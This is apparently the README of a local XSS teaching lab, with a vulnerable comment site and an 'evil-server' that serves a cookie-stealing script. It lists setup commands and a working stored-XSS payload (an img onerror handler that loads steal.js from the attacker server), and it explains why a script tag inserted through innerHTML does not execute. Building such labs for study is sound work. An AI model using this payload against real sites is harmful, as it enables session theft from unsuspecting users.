# How to use this?
+ `cd .\normal-site\ & npm install express body-parser`
+ `node .\app.js`
+ `cd .\evil-server\ & npm install express`
+ `node .\steal_cookie.js`
+ Open browser and visit website at `http://localhost:3000`
+ Try to post your comment on the page, and inspect the changes from browser Network/Elements Tab
Recommended XSS payload: `<img src="x" onerror="const s=document.createElement('script');s.src='http://localhost:4000/steal.js';document.body.appendChild(s);" />`  
Not recommended XSS payload: `<script src="http://localhost:4000/steal.js"></script>`. This is because the limitations of `innerHTML`. The `<script>` tag dynamically inserted through `innerHTML` will be parsed by browser as a text node rather than an executable script.
+ 